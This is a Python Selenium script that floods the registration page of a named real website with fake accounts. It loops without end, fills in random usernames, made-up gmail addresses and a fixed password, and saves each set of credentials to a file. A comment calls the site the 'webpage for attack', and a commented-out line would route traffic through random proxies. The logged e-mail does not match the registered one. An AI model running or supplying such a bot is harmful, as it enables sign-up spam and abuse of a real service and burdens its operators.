from selenium import webdriver
import os
import random
import string
import json
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions
from selenium.common.exceptions import NoSuchElementException
import time
from selenium.webdriver.chrome.options import Options

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

def random_line(fname):
    lines = open(fname).read().splitlines()
    return random.choice(lines)
	

#chrome_options.add_argument('--proxy-server=%s' % "http://" + random_line('proxy.txt'))
driver = webdriver.Chrome() # Google Chrome
f = open('cuentas.txt','a')
def BotCuenta():
	while True:
		url = 'https://habbine.me/register'  # Pagina para atacar // Webpage for attack
		driver.get(url)
		name = id_generator()
		driver.find_element_by_name('rUsername').send_keys(name)  # Usuario
		driver.find_element_by_name('rEmail').send_keys(name + '@gmail.com')  # Correo electronico
		driver.find_element_by_name('rPassword').send_keys('12345678')  # Contraseña
		driver.find_element_by_name('rPassword2').send_keys('12345678') # Repetir contraseña
		driver.find_element_by_name('register').click()  # Boton
		url2 = 'https://habbine.me/logout'
		driver.get(url2)
		f.write('Username: ' + name + " Password: " + "12345678" + " E-mail: " + id_generator() + "@gmail.com" + '\n')
		print('Username: ' + name + " Password: " + "12345678" + " E-mail: " + id_generator() + "@gmail.com")
BotCuenta()